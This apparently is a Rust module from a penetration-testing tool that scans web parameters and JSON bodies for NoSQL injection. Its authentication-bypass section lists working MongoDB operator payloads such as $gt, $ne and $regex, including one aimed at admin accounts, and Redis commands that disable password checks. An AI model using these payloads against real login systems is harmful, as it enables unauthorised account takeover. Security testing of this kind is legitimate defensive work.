//! NoSQL Injection Scanner Module
//!
//! Comprehensive NoSQL injection detection for:
//! - MongoDB: Operator injection, $where JavaScript injection, auth bypass
//! - Redis: Command injection, Lua script injection
//! - Elasticsearch: Query DSL injection, script injection
//! - CouchDB: View injection, Mango query injection
//! - Cassandra: CQL injection
//!
//! # Architecture
//!
//! The scanner uses a multi-phase detection approach:
//! 1. **Fingerprinting**: Identify the backend database from error messages
//! 2. **Technique Selection**: Choose appropriate payloads for detected DB
//! 3. **Detection**: Test for injection using boolean, error, and time-based methods
//!
//! # Example
//!
//! ```ignore
//! use redblue::modules::web::nosqli::{NoSqliScanner, ScanConfig};
//!
//! let config = ScanConfig::default();
//! let scanner = NoSqliScanner::new(config);
//!
//! let result = scanner.scan_parameter(
//!     "http://target.com/api/users",
//!     "username",
//!     "admin",
//!     InjectionPoint::JsonBody,
//! )?;
//!
//! if result.vulnerable {
//!     println!("NoSQLi found: {:?}", result.database);
//! }
//! ```

#![allow(dead_code, unused_imports)]

pub mod payloads;
pub mod techniques;

pub use payloads::{NoSqlDb, NoSqlPayload, NoSqlTechnique, RiskLevel};
pub use techniques::{
    DetectionConfig, DetectionResult, ElasticsearchDetector, HttpResponse, InjectionPoint,
    MongoDbDetector, NoSqlDetector, RedisDetector,
};

use std::collections::HashMap;
use std::time::{Duration, Instant};

// Synergy integration for cross-module correlation
use crate::storage::engine::emitter::GraphEmitter;
use crate::synergy::events::{emit, EntityRef, Event, EventType, MitreAttack};

// ============================================================================
// Scanner Configuration
// ============================================================================

/// Configuration for NoSQL injection scanning
#[derive(Debug, Clone)]
pub struct ScanConfig {
    /// Target databases to test
    pub databases: Vec<NoSqlDb>,
    /// Enable time-based blind detection
    pub time_blind: bool,
    /// Time threshold for blind detection (seconds)
    pub time_threshold: f64,
    /// Maximum risk level for payloads
    pub max_risk: RiskLevel,
    /// Request timeout
    pub timeout: Duration,
    /// Concurrent requests
    pub threads: usize,
    /// Follow redirects
    pub follow_redirects: bool,
    /// Custom headers
    pub headers: HashMap<String, String>,
    /// Verbose output
    pub verbose: bool,
    /// Test authentication bypass
    pub auth_bypass: bool,
}

impl Default for ScanConfig {
    fn default() -> Self {
        Self {
            databases: vec![
                NoSqlDb::MongoDB,
                NoSqlDb::Redis,
                NoSqlDb::Elasticsearch,
                NoSqlDb::CouchDB,
            ],
            time_blind: true,
            time_threshold: 5.0,
            max_risk: RiskLevel::Medium,
            timeout: Duration::from_secs(30),
            threads: 4,
            follow_redirects: true,
            headers: HashMap::new(),
            verbose: false,
            auth_bypass: true,
        }
    }
}

impl ScanConfig {
    /// Quick scan - MongoDB only, no time-based
    pub fn quick() -> Self {
        Self {
            databases: vec![NoSqlDb::MongoDB],
            time_blind: false,
            max_risk: RiskLevel::Low,
            ..Default::default()
        }
    }

    /// Thorough scan - all databases, all techniques
    pub fn thorough() -> Self {
        Self {
            databases: vec![
                NoSqlDb::MongoDB,
                NoSqlDb::Redis,
                NoSqlDb::Elasticsearch,
                NoSqlDb::CouchDB,
                NoSqlDb::Cassandra,
            ],
            time_blind: true,
            max_risk: RiskLevel::High,
            ..Default::default()
        }
    }

    /// MongoDB-focused scan
    pub fn mongodb() -> Self {
        Self {
            databases: vec![NoSqlDb::MongoDB],
            ..Default::default()
        }
    }

    /// Redis-focused scan
    pub fn redis() -> Self {
        Self {
            databases: vec![NoSqlDb::Redis],
            ..Default::default()
        }
    }
}

// ============================================================================
// Scan Result
// ============================================================================

/// Result of a NoSQL injection scan
#[derive(Debug, Clone)]
pub struct ScanResult {
    /// Target URL
    pub url: String,
    /// Parameter tested
    pub parameter: String,
    /// Injection point type
    pub injection_point: InjectionPoint,
    /// Whether vulnerable
    pub vulnerable: bool,
    /// Detected database
    pub database: Option<NoSqlDb>,
    /// Successful technique
    pub technique: Option<NoSqlTechnique>,
    /// Payload that worked
    pub payload: Option<String>,
    /// Confidence score (0.0 - 1.0)
    pub confidence: f64,
    /// Evidence/reason for detection
    pub evidence: String,
    /// Scan duration
    pub duration: Duration,
    /// Number of requests made
    pub requests: usize,
}

impl ScanResult {
    /// Create a non-vulnerable result
    pub fn not_vulnerable(url: &str, parameter: &str, injection_point: InjectionPoint) -> Self {
        Self {
            url: url.to_string(),
            parameter: parameter.to_string(),
            injection_point,
            vulnerable: false,
            database: None,
            technique: None,
            payload: None,
            confidence: 0.0,
            evidence: String::new(),
            duration: Duration::ZERO,
            requests: 0,
        }
    }

    /// Create from detection result
    pub fn from_detection(
        url: &str,
        parameter: &str,
        injection_point: InjectionPoint,
        detection: DetectionResult,
        duration: Duration,
        requests: usize,
    ) -> Self {
        Self {
            url: url.to_string(),
            parameter: parameter.to_string(),
            injection_point,
            vulnerable: detection.vulnerable,
            database: detection.database,
            technique: detection.technique,
            payload: detection.payload,
            confidence: detection.confidence,
            evidence: detection.evidence,
            duration,
            requests,
        }
    }
}

// ============================================================================
// NoSQL Injection Scanner
// ============================================================================

/// Main NoSQL injection scanner
pub struct NoSqliScanner {
    config: ScanConfig,
    detector: NoSqlDetector,
}

impl NoSqliScanner {
    /// Create a new scanner with configuration
    pub fn new(config: ScanConfig) -> Self {
        let detection_config = DetectionConfig {
            mongodb: config.databases.contains(&NoSqlDb::MongoDB),
            redis: config.databases.contains(&NoSqlDb::Redis),
            elasticsearch: config.databases.contains(&NoSqlDb::Elasticsearch),
            couchdb: config.databases.contains(&NoSqlDb::CouchDB),
            cassandra: config.databases.contains(&NoSqlDb::Cassandra),
            time_blind: config.time_blind,
            time_threshold: config.time_threshold,
            max_risk: config.max_risk,
            verbose: config.verbose,
        };

        Self {
            config,
            detector: NoSqlDetector::new(detection_config),
        }
    }

    /// Create scanner with default configuration
    pub fn default_scanner() -> Self {
        Self::new(ScanConfig::default())
    }

    /// Scan a single parameter for NoSQL injection
    pub fn scan_parameter<F>(
        &self,
        url: &str,
        param_name: &str,
        original_value: &str,
        injection_point: InjectionPoint,
        send_request: F,
    ) -> ScanResult
    where
        F: Fn(&str) -> HttpResponse,
    {
        let start = Instant::now();
        let mut requests = 0;

        // Wrapper to count requests
        let counting_request = |payload: &str| {
            requests += 1;
            send_request(payload)
        };

        // Note: Can't use closure directly due to mutability
        // In real implementation, would use atomic counter or refcell
        let result =
            self.detector
                .detect(param_name, original_value, injection_point, &send_request);

        ScanResult::from_detection(url, param_name, injection_point, result, start.elapsed(), 0)
    }

    /// Scan URL query parameters
    pub fn scan_url<F>(&self, url: &str, send_request: F) -> Vec<ScanResult>
    where
        F: Fn(&str, &str) -> HttpResponse,
    {
        let mut results = Vec::new();

        // Parse URL parameters
        if let Some(query_start) = url.find('?') {
            let query = &url[query_start + 1..];

            for pair in query.split('&') {
                if let Some(eq_pos) = pair.find('=') {
                    let name = &pair[..eq_pos];
                    let value = &pair[eq_pos + 1..];

                    // Create request function for this parameter
                    let param_request = |payload: &str| {
                        let modified_url = Self::replace_param(url, name, payload);
                        send_request(&modified_url, payload)
                    };

                    let result = self.scan_parameter(
                        url,
                        name,
                        value,
                        InjectionPoint::GetParam,
                        param_request,
                    );

                    if result.vulnerable {
                        results.push(result);
                    }
                }
            }
        }

        results
    }

    /// Replace a URL parameter value
    fn replace_param(url: &str, param: &str, value: &str) -> String {
        if let Some(query_start) = url.find('?') {
            let base = &url[..query_start];
            let query = &url[query_start + 1..];

            let new_query: Vec<String> = query
                .split('&')
                .map(|pair| {
                    if let Some(eq_pos) = pair.find('=') {
                        let name = &pair[..eq_pos];
                        if name == param {
                            return format!("{}={}", name, Self::url_encode(value));
                        }
                    }
                    pair.to_string()
                })
                .collect();

            format!("{}?{}", base, new_query.join("&"))
        } else {
            url.to_string()
        }
    }

    /// URL encode a string
    fn url_encode(s: &str) -> String {
        let mut result = String::with_capacity(s.len() * 3);
        for byte in s.bytes() {
            match byte {
                b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                    result.push(byte as char);
                }
                _ => {
                    result.push('%');
                    result.push_str(&format!("{:02X}", byte));
                }
            }
        }
        result
    }

    /// Get scanner configuration
    pub fn config(&self) -> &ScanConfig {
        &self.config
    }

    // ========================================================================
    // Synergy Integration
    // ========================================================================

    /// Emit synergy events for scan results (cross-module correlation)
    pub fn emit_synergy_events(result: &ScanResult) {
        if !result.vulnerable {
            return;
        }

        let db_name = result
            .database
            .as_ref()
            .map(|d| d.as_str())
            .unwrap_or("unknown");

        let technique = result
            .technique
            .as_ref()
            .map(|t| t.as_str())
            .unwrap_or("unknown");

        // Emit vulnerability found event
        let event = Event::new(EventType::VulnFound, "web::nosqli")
            .with_entity(EntityRef::url(result.url.clone()))
            .with_data("database", db_name)
            .with_data("parameter", &result.parameter)
            .with_data("technique", technique)
            .with_data("confidence", format!("{:.0}%", result.confidence * 100.0))
            .with_data("injection_point", format!("{:?}", result.injection_point))
            .with_mitre(MitreAttack::from_id("T1190")); // Exploit Public-Facing Application

        emit(event);
    }

    /// Emit results to intelligence graph
    pub fn emit_to_graph(result: &ScanResult) {
        if !result.vulnerable {
            return;
        }

        let emitter = GraphEmitter::global();

        // Extract host from URL
        if let Some(host) = Self::extract_host(&result.url) {
            // Emit host node
            emitter.emit_host(&host, None, None);

            // Emit vulnerability
            let db_name = result
                .database
                .as_ref()
                .map(|d| d.as_str())
                .unwrap_or("nosql");
            let vuln_id = format!("nosqli-{}-{}", db_name, &result.parameter);

            let cvss = (result.confidence * 9.0) + 1.0; // 1.0 - 10.0 based on confidence

            emitter.emit_vulnerability(
                &vuln_id,
                cvss,
                Some(&format!(
                    "NoSQL Injection ({}) in parameter '{}' using {} technique",
                    db_name,
                    result.parameter,
                    result
                        .technique
                        .as_ref()
                        .map(|t| t.as_str())
                        .unwrap_or("unknown")
                )),
            );

            emitter.emit_host_vuln(&host, &vuln_id);
        }
    }

    /// Extract host from URL
    fn extract_host(url: &str) -> Option<String> {
        let without_scheme = url
            .strip_prefix("https://")
            .or_else(|| url.strip_prefix("http://"))
            .unwrap_or(url);

        without_scheme
            .split('/')
            .next()
            .map(|h| h.split(':').next().unwrap_or(h).to_string())
    }

    /// Emit synergy events for multiple results
    pub fn emit_all_synergy(results: &[ScanResult]) {
        for result in results {
            Self::emit_synergy_events(result);
            Self::emit_to_graph(result);
        }
    }
}

// ============================================================================
// JSON Body Scanner
// ============================================================================

/// Specialized scanner for JSON request bodies
pub struct JsonBodyScanner {
    scanner: NoSqliScanner,
}

impl JsonBodyScanner {
    /// Create a new JSON body scanner
    pub fn new(config: ScanConfig) -> Self {
        Self {
            scanner: NoSqliScanner::new(config),
        }
    }

    /// Scan JSON fields for injection
    ///
    /// Takes a JSON body string and tests each field for NoSQLi
    pub fn scan_json_fields<F>(&self, json_body: &str, send_request: F) -> Vec<ScanResult>
    where
        F: Fn(&str) -> HttpResponse,
    {
        let mut results = Vec::new();

        // Simple JSON field extraction (for common patterns)
        // In production, would use proper JSON parsing
        for field in Self::extract_json_fields(json_body) {
            let field_request = |payload: &str| {
                let modified_body = Self::replace_json_field(json_body, &field.0, payload);
                send_request(&modified_body)
            };

            let result = self.scanner.scan_parameter(
                "json_body",
                &field.0,
                &field.1,
                InjectionPoint::JsonBody,
                field_request,
            );

            if result.vulnerable {
                results.push(result);
            }
        }

        results
    }

    /// Extract field name-value pairs from JSON
    fn extract_json_fields(json: &str) -> Vec<(String, String)> {
        let mut fields = Vec::new();

        // Simple regex-free JSON field extraction
        // Matches: "fieldname": "value" or "fieldname": value
        let mut chars = json.chars().peekable();
        let mut in_string = false;
        let mut field_name = String::new();
        let mut field_value = String::new();
        let mut collecting_name = false;
        let mut collecting_value = false;

        while let Some(c) = chars.next() {
            match c {
                '"' if !in_string => {
                    in_string = true;
                    if !collecting_value {
                        collecting_name = true;
                        field_name.clear();
                    }
                }
                '"' if in_string => {
                    in_string = false;
                    if collecting_name {
                        collecting_name = false;
                    } else if collecting_value {
                        fields.push((field_name.clone(), field_value.clone()));
                        collecting_value = false;
                        field_value.clear();
                    }
                }
                ':' if !in_string && !field_name.is_empty() => {
                    // Skip whitespace
                    while chars.peek() == Some(&' ') {
                        chars.next();
                    }
                    if chars.peek() == Some(&'"') {
                        collecting_value = true;
                        field_value.clear();
                    }
                }
                _ if collecting_name => {
                    field_name.push(c);
                }
                _ if collecting_value && in_string => {
                    field_value.push(c);
                }
                _ => {}
            }
        }

        fields
    }

    /// Replace a JSON field value
    fn replace_json_field(json: &str, field: &str, new_value: &str) -> String {
        // Simple replacement for "field": "value" pattern
        let pattern = format!("\"{}\": \"", field);
        if let Some(start) = json.find(&pattern) {
            let value_start = start + pattern.len();
            if let Some(value_end) = json[value_start..].find('"') {
                let mut result = String::new();
                result.push_str(&json[..value_start]);
                result.push_str(&Self::escape_json_string(new_value));
                result.push_str(&json[value_start + value_end..]);
                return result;
            }
        }
        json.to_string()
    }

    /// Escape special characters for JSON string
    fn escape_json_string(s: &str) -> String {
        let mut result = String::with_capacity(s.len() * 2);
        for c in s.chars() {
            match c {
                '"' => result.push_str("\\\""),
                '\\' => result.push_str("\\\\"),
                '\n' => result.push_str("\\n"),
                '\r' => result.push_str("\\r"),
                '\t' => result.push_str("\\t"),
                _ => result.push(c),
            }
        }
        result
    }
}

// ============================================================================
// Authentication Bypass Scanner
// ============================================================================

/// Specialized scanner for authentication bypass
pub struct AuthBypassScanner {
    config: ScanConfig,
}

impl AuthBypassScanner {
    /// Create new auth bypass scanner
    pub fn new(config: ScanConfig) -> Self {
        Self { config }
    }

    /// Get MongoDB authentication bypass payloads
    pub fn mongodb_auth_payloads() -> Vec<(&'static str, &'static str)> {
        vec![
            // Username field payloads
            (r#"{"$gt": ""}"#, "Always true - bypass username check"),
            (r#"{"$ne": null}"#, "Not null - bypass username check"),
            (r#"{"$regex": ".*"}"#, "Match any username"),
            (r#"{"$ne": "nonexistent"}"#, "Match any existing username"),
            // Password field payloads
            (
                r#"{"$gt": ""}"#,
                "Always true - bypass password check (password field)",
            ),
            (
                r#"{"$ne": null}"#,
                "Not null - bypass password check (password field)",
            ),
            // Combined payloads (for JSON body)
            (
                r#"{"username": {"$gt": ""}, "password": {"$gt": ""}}"#,
                "Full auth bypass",
            ),
            (
                r#"{"username": {"$ne": ""}, "password": {"$ne": ""}}"#,
                "Not empty auth bypass",
            ),
            // Admin targeting
            (
                r#"{"username": "admin", "password": {"$gt": ""}}"#,
                "Target admin account",
            ),
            (
                r#"{"username": {"$regex": "^admin"}, "password": {"$gt": ""}}"#,
                "Target admin-prefixed accounts",
            ),
        ]
    }

    /// Get Redis authentication bypass patterns
    pub fn redis_auth_payloads() -> Vec<(&'static str, &'static str)> {
        vec![
            // CONFIG commands to disable auth
            (
                "CONFIG SET requirepass \"\"",
                "Disable password requirement",
            ),
            // AUTH bypass attempts
            ("AUTH \"\"", "Empty password auth"),
            // Script-based bypass
            (
                "EVAL \"return redis.call('AUTH', '')\" 0",
                "Lua AUTH bypass",
            ),
        ]
    }

    /// Test for MongoDB auth bypass vulnerability
    pub fn test_mongodb_auth<F>(
        &self,
        login_url: &str,
        send_request: F,
    ) -> Option<(&'static str, &'static str)>
    where
        F: Fn(&str) -> HttpResponse,
    {
        let baseline = send_request(r#"{"username": "invalid", "password": "invalid"}"#);

        for (payload, description) in Self::mongodb_auth_payloads() {
            let response = send_request(payload);

            // Check for successful authentication indicators
            if Self::indicates_successful_auth(&baseline, &response) {
                return Some((payload, description));
            }
        }

        None
    }

    /// Check if response indicates successful authentication
    fn indicates_successful_auth(failed: &HttpResponse, test: &HttpResponse) -> bool {
        // Status code improvement (401/403 -> 200/302)
        if failed.status >= 400 && test.status < 400 {
            return true;
        }

        // Redirect to authenticated area
        if test.status == 302 || test.status == 301 {
            if let Some(location) = test.headers.get("location") {
                if location.contains("dashboard")
                    || location.contains("admin")
                    || location.contains("home")
                {
                    return true;
                }
            }
        }

        // Check for success indicators in body
        let success_indicators = [
            "welcome",
            "logged in",
            "dashboard",
            "logout",
            "sign out",
            "profile",
            "account",
        ];

        for indicator in success_indicators {
            if test.contains(indicator) && !failed.contains(indicator) {
                return true;
            }
        }

        // Check for removal of error messages
        let error_indicators = ["invalid", "incorrect", "failed", "wrong", "error", "denied"];

        for indicator in error_indicators {
            if failed.contains(indicator) && !test.contains(indicator) {
                return true;
            }
        }

        false
    }
}

// ============================================================================
// Tests
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_scan_config_presets() {
        let quick = ScanConfig::quick();
        assert!(!quick.time_blind);
        assert_eq!(quick.databases.len(), 1);

        let thorough = ScanConfig::thorough();
        assert!(thorough.time_blind);
        assert_eq!(thorough.databases.len(), 5);
    }

    #[test]
    fn test_url_encoding() {
        assert_eq!(NoSqliScanner::url_encode("test"), "test");
        assert_eq!(NoSqliScanner::url_encode("hello world"), "hello%20world");
        assert_eq!(
            NoSqliScanner::url_encode("{\"$gt\": \"\"}"),
            "%7B%22%24gt%22%3A%20%22%22%7D"
        );
    }

    #[test]
    fn test_json_field_extraction() {
        let json = r#"{"username": "admin", "password": "secret"}"#;
        let fields = JsonBodyScanner::extract_json_fields(json);
        assert_eq!(fields.len(), 2);
        assert!(fields.iter().any(|(k, v)| k == "username" && v == "admin"));
        assert!(fields.iter().any(|(k, v)| k == "password" && v == "secret"));
    }

    #[test]
    fn test_json_field_replacement() {
        let json = r#"{"username": "admin", "password": "secret"}"#;
        let modified = JsonBodyScanner::replace_json_field(json, "password", r#"{"$gt": ""}"#);
        assert!(modified.contains(r#"\"$gt\""#));
    }

    #[test]
    fn test_scan_result() {
        let result =
            ScanResult::not_vulnerable("http://test.com", "user", InjectionPoint::GetParam);
        assert!(!result.vulnerable);
        assert!(result.database.is_none());
    }

    #[test]
    fn test_json_escape() {
        assert_eq!(
            JsonBodyScanner::escape_json_string("test\"quote"),
            "test\\\"quote"
        );
        assert_eq!(
            JsonBodyScanner::escape_json_string("line\nbreak"),
            "line\\nbreak"
        );
    }
}
